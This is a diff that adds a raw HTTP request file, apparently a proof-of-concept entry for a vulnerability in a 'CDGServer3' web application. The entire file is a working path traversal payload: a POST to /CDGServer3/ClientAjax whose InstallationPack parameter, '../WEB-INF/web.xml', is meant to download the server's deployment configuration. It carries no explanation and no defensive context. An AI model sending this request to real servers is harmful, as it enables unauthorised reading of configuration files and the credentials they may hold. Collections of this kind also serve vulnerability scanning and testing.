@@ -1,0 +1,7 @@
+POST /CDGServer3/ClientAjax HTTP/1.1
+Host:
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 75
+command=downclientpak&InstallationPack=../WEB-INF/web.xml&forward=index.jsp
+
+
